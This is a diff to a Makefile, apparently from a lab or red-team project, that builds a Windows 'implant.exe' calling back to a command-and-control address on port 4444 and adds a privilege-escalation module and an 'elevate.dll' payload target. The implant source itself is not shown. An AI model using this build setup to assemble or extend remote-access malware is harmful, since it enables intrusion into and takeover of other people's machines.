@@ -8,9 +8,9 @@
 C2_IP   ?= 192.168.56.104
 C2_PORT ?= 4444
 
-SRCS  = main.c aes.c crypto.c shell.c
+SRCS  = main.c aes.c crypto.c shell.c privesc.c
 FLAGS = -DCLIENT_IP=\"$(C2_IP)\" -DCLIENT_PORT=$(C2_PORT) -DWAIT_FOR_CLIENT
-LIBS  = -lws2_32 -lbcrypt
+LIBS  = -lws2_32 -lbcrypt -lwinspool
 
 cross:
 	x86_64-w64-mingw32-gcc -o implant.exe $(SRCS) $(FLAGS) $(LIBS) \
@@ -22,5 +22,10 @@ windows:
 	gcc -o implant.exe $(SRCS) $(FLAGS) $(LIBS)
 	@echo "[+] implant.exe généré"
 
+dll:
+	x86_64-w64-mingw32-gcc -shared -o elevate.dll ../payloads/elevate.c -s
+	@echo "[+] elevate.dll généré"
+	@ls -lh elevate.dll
+
 clean:
-	rm -f implant.exe
+	rm -f implant.exe elevate.dll
